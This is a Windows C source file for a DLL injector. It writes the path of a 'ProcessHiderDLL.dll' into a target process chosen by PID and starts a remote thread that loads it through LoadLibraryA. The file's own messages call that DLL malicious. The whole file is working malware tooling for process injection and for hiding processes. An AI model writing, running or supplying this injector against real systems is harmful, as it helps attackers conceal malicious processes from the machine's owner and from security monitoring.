#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <malloc.h>
#include <memoryapi.h>
#include <processthreadsapi.h>

int main() {
	printf("Enter the path for \"ProcessHiderDLL.dll\": ");
	const int pathLen = 256;
	char* processHiderPath = malloc(pathLen);
	scanf_s("%s", processHiderPath, pathLen);

	printf("Enter a pid to inject \"ProcessHiderDLL.dll\" into: ");
	int pid;
	scanf_s("%d", &pid);

	HANDLE handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	int dllNameLen = strlen(processHiderPath) + 1;
	if (handle != NULL) {
		printf("[*] Opening the process\r\n");
		LPVOID dllNamePointer = VirtualAllocEx(handle, NULL, dllNameLen, 0x3000, PAGE_READWRITE); //allocate a buffer in the process for the name of process hider dll 
		if (dllNamePointer != NULL) {
			printf("[*] Allocating the memory in the process\r\n");
			if (WriteProcessMemory(handle, dllNamePointer, processHiderPath, dllNameLen, NULL) != 0) { //write the name of process hider dll in the allocated memory
				printf("[*] Writing The malicious dll name in the process\r\n");
				if (CreateRemoteThread(handle, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, dllNamePointer, 0, NULL) != NULL) { //create remote thread in the process which loads the process hider dll
					printf("[*] Creating the remote thread\r\n");
				} else {
					printf("[!] Error in CreateRemoteThread function: %x (error code)\r\n", GetLastError());
				}
			}
		}
	}
	printf("Press Enter to exit...");
	char c;
	scanf_s("%c", &c);
	scanf_s("%c", &c);
	return 0;
}
